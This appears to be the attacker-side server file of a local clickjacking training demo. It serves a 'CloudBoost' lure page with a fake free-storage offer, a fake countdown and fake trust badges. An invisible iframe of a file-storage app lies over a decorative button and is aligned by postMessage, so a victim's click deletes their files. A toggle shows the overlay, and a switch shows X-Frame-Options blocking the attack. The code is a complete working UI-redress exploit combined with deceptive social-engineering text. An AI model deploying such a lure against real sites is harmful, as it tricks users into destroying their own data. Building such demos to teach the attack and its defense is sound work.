/*
 * How to Run:
 *
 * Terminal 1: cd demo-attacked/clickjacking && npm install && npm run vulnerable
 * Terminal 2: cd demo-attacked/clickjacking && npm run guide
 *
 * Attack sequence:
 * 1. http://localhost:3013  ← CloudVault (note 6 files)
 * 2. http://localhost:3014  ← CloudBoost lure — toggle overlay to see alignment
 * 3. Click "Claim My Free Upgrade" — confirm dialog appears (from hidden iframe)
 * 4. Return to localhost:3013 — all files deleted
 */

const express = require('express');

const app = express();
const PORT = 3014;
const VICTIM_PORT = 3013;
const PROTECTED_PORT = 3015;

const LURE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CloudBoost — Free Storage Upgrade</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #0f172a 100%);
      color: #fff;
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* Visible lure — decorative layer below the invisible iframe */
    .lure-content {
      position: relative;
      z-index: 1;
      pointer-events: none;
      max-width: 560px;
      margin: 0 auto;
      padding: 3rem 1.5rem 5rem;
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .brand {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 2.5rem;
      color: #93c5fd;
    }
    h1 {
      font-size: 2rem;
      line-height: 1.25;
      margin-bottom: 1.25rem;
    }
    .subtext {
      color: #cbd5e1;
      font-size: 1.05rem;
      line-height: 1.7;
      margin-bottom: 2rem;
    }
    .countdown {
      font-size: 2.5rem;
      font-weight: 800;
      font-variant-numeric: tabular-nums;
      color: #fbbf24;
      margin-bottom: 2rem;
      letter-spacing: 0.05em;
    }
    .countdown-label {
      font-size: 0.85rem;
      color: #94a3b8;
      margin-bottom: 0.5rem;
      text-transform: uppercase;
      letter-spacing: 0.1em;
    }

    /*
     * Correct clickjacking CSS model:
     * - iframe: opacity 0, z-index 2 (on top, invisible, receives clicks)
     * - CTA button: z-index 1, pointer-events none (visible, decorative only)
     * The victim sees the green button but the iframe intercepts all clicks.
     * Delete-button position in the iframe is synced via postMessage (embed=1).
     */
    .cta-zone {
      margin-top: 2rem;
      width: 100%;
    }
    .cta-button {
      background: #16a34a;
      color: #fff;
      border: none;
      padding: 0.85rem 1.25rem;
      border-radius: 8px;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 32px rgba(22, 163, 74, 0.4);
      width: 220px;
      line-height: 1.3;
      transition: background 0.2s;
    }
    .cta-button.overlay-visible {
      background: rgba(220, 38, 38, 0.6);
    }
    .click-hint {
      color: #94a3b8;
      font-size: 0.9rem;
      text-align: center;
      line-height: 1.4;
      margin-top: 0.75rem;
    }
    .trust-signals {
      display: flex;
      justify-content: center;
      gap: 2rem;
      margin-top: 2rem;
      font-size: 0.9rem;
      color: #94a3b8;
      flex-wrap: wrap;
    }

    #victim-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      z-index: 2;
      border: none;
    }
    #victim-frame.overlay-visible {
      opacity: 0.4;
      border: 3px solid #dc2626;
    }

    .debug-toggle {
      position: fixed;
      bottom: 1.25rem;
      right: 1.25rem;
      z-index: 10;
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #475569;
      padding: 0.6rem 1rem;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.85rem;
      font-weight: 600;
    }
    .debug-toggle:hover { background: #334155; }

    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #ef4444;
    }

    .blocked-message {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 5;
      background: rgba(15, 23, 42, 0.95);
      border: 2px solid #16a34a;
      color: #86efac;
      padding: 1.5rem 2rem;
      border-radius: 12px;
      font-size: 1rem;
      font-weight: 600;
      text-align: center;
      max-width: 420px;
      pointer-events: none;
    }
    .blocked-message.visible { display: block; }
  </style>
</head>
<body>
  <!--
    Invisible iframe on top (z-index 2) receives all clicks.
    The green CTA below is decorative (pointer-events: none).
  -->
  <iframe
    src="http://localhost:${VICTIM_PORT}?embed=1"
    id="victim-frame"
    title="Hidden victim frame"
  ></iframe>

  <div class="lure-content">
    <div class="brand">CloudBoost ☁️ — Supercharge your storage</div>
    <h1>You've been selected for a free 2TB upgrade!</h1>
    <p class="subtext">
      As an active CloudVault user, you qualify for our premium tier —
      completely free for 12 months. Claim before the offer expires.
    </p>
    <div class="countdown-label">Offer expires in</div>
    <div class="countdown" id="countdown">04:59</div>
    <div class="trust-signals">
      <span>🔒 Secure</span>
      <span>✅ No credit card</span>
      <span>⭐ 4.9/5 rating</span>
    </div>
    <div class="cta-zone">
      <button class="cta-button" id="cta-button">Claim My Free Upgrade →</button>
      <p class="click-hint">👆 Click anywhere on the button above</p>
    </div>
  </div>

  <div class="blocked-message" id="blocked-message">
    🛡️ Iframe blocked — target server sent X-Frame-Options: DENY
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable active" id="btn-vulnerable" data-port="${VICTIM_PORT}">Vulnerable (:${VICTIM_PORT})</button>
    <button type="button" class="btn-protected" id="btn-protected" data-port="${PROTECTED_PORT}">Protected (:${PROTECTED_PORT})</button>
  </div>

  <button class="debug-toggle" id="debug-toggle">🔍 Show Overlay</button>

  <script>
    var frame = document.getElementById('victim-frame');
    var ctaButton = document.getElementById('cta-button');
    var debugToggle = document.getElementById('debug-toggle');
    var blockedMessage = document.getElementById('blocked-message');
    var overlayOn = false;
    var currentTarget = 'vulnerable';
    var victimOrigin = 'http://localhost:${VICTIM_PORT}';

    /* Sync iframe delete-button position to match the visible CTA */
    function syncIframeAlignment() {
      if (currentTarget !== 'vulnerable') return;
      var rect = ctaButton.getBoundingClientRect();
      try {
        frame.contentWindow.postMessage({
          type: 'align-delete',
          top: rect.top,
          width: rect.width
        }, victimOrigin);
      } catch (err) { /* iframe not ready */ }
    }

    /* Fake countdown from 04:59 */
    var totalSeconds = 4 * 60 + 59;
    var countdownEl = document.getElementById('countdown');

    function formatTime(secs) {
      var m = Math.floor(secs / 60);
      var s = secs % 60;
      return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
    }

    setInterval(function () {
      if (totalSeconds > 0) totalSeconds--;
      countdownEl.textContent = formatTime(totalSeconds);
    }, 1000);

    debugToggle.addEventListener('click', function () {
      overlayOn = !overlayOn;
      frame.classList.toggle('overlay-visible', overlayOn);
      ctaButton.classList.toggle('overlay-visible', overlayOn);
      debugToggle.textContent = overlayOn ? '🔍 Hide Overlay' : '🔍 Show Overlay';
    });

    document.getElementById('btn-vulnerable').addEventListener('click', function () {
      currentTarget = 'vulnerable';
      victimOrigin = 'http://localhost:${VICTIM_PORT}';
      frame.src = 'http://localhost:${VICTIM_PORT}?embed=1';
      blockedMessage.classList.remove('visible');
      document.getElementById('btn-vulnerable').classList.add('active');
      document.getElementById('btn-protected').classList.remove('active');
    });

    document.getElementById('btn-protected').addEventListener('click', function () {
      currentTarget = 'protected';
      victimOrigin = 'http://localhost:${PROTECTED_PORT}';
      frame.src = 'http://localhost:${PROTECTED_PORT}?embed=1';
      document.getElementById('btn-protected').classList.add('active');
      document.getElementById('btn-vulnerable').classList.remove('active');

      /*
       * Note: cross-origin iframe blocking detection is unreliable.
       * Browsers may not fire onerror for header-blocked frames.
       * Primary evidence is the blank iframe + browser console error.
       */
      setTimeout(function () {
        try {
          var doc = frame.contentDocument || frame.contentWindow.document;
          if (!doc || !doc.body || doc.body.innerHTML === '') {
            blockedMessage.classList.add('visible');
          }
        } catch (e) {
          if (currentTarget === 'protected') {
            blockedMessage.classList.add('visible');
          }
        }
      }, 800);
    });

    frame.addEventListener('load', function () {
      if (currentTarget === 'protected') {
        try {
          var doc = frame.contentDocument;
          if (!doc || !doc.body || doc.body.children.length === 0) {
            blockedMessage.classList.add('visible');
          }
        } catch (e) {
          blockedMessage.classList.add('visible');
        }
      } else {
        blockedMessage.classList.remove('visible');
        syncIframeAlignment();
      }
    });

    window.addEventListener('resize', syncIframeAlignment);
    window.addEventListener('load', syncIframeAlignment);

    frame.addEventListener('error', function () {
      if (currentTarget === 'protected') {
        blockedMessage.classList.add('visible');
      }
    });
  </script>
</body>
</html>`;

app.get('/', function (req, res) {
  res.send(LURE_HTML);
});

app.listen(PORT, function () {
  console.log('CloudBoost attacker lure running at http://localhost:' + PORT);
});
